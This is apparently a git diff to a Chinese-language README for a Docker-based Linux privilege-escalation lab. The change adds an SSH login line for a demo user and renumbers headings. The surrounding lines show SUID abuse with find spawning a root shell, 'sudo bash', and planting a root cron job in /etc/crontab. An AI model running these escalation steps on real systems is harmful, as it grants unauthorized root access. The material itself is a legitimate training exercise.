@@ -12,8 +12,11 @@ docker run -d -p 10022:22 linux_elevate
 ```
 ## 演示
 ### 登陆普通用户ssh
-zhangsan/123456
-### suid提权
+> 用户名：zhangsan / 密码：123456
+```
+ssh zhangsan@127.0.0.1 -p10022
+```
+### 0x1. suid 提权
 1. 搜索suid权限的文件
 ```
 find / -perm -u=s -type f 2>/dev/null
@@ -27,7 +30,7 @@ find . -exec /bin/sh -p \; -quit
 ```
 <img width="880" alt="image" src="https://github.com/user-attachments/assets/2499a2a7-cb50-4687-ba21-7777ff1f607a">
 
-### sudo 提权
+### 0x2. sudo 提权
 1. 查看当前用户的sudo权限
 ```
 sudo -l
@@ -39,7 +42,7 @@ sudo -l
 sudo bash
 ```
 
-### 配置错误提权
+### 0x3. 配置错误提权
 #### 用户文件权限配置错误
 > emmmm 这种提权就很迷
 1. 查看 `/etc/passwd` 文件权限
@@ -80,7 +83,7 @@ echo "*/1 * * * * root /tmp/1.sh" >> /etc/crontab
 ./bash666 -p
 ```
    
-### 环境变量提权
+### 0x4.环境变量提权
 1. 搜索suid权限的文件
 ```
 find / -perm -u=s -type f 2>/dev/null
